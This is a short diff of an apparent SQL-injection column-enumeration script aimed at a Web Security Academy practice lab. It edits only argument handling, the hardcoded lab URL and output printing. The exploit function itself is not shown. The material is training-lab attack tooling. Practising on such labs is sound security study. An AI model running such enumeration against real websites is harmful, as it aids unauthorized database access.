@@ -58,16 +58,14 @@ def exploit_sqli(url):
 
 if __name__ == "__main__":
     try:
-        url = sys.argv[1].strip()
-        payload = sys.argv[2].strip()
+        url = sys.argv[1]
     except IndexError:
         print("[-] Usage: %s <url> <payload>" % sys.argv[0])
-        print('[-] Example: %s www.example.com' % sys.argv[0])
         
         # Opional filling Manually
         url = 'https://0af800fc04253ac682f1f75800f30075.web-security-academy.net'  #Update Domain here
 
-        num_col= exploit_sqli(url)
+    num_col= exploit_sqli(url)
 
     if num_col:
         print("[+] The Number of column(s) are "+str(num_col)+"")
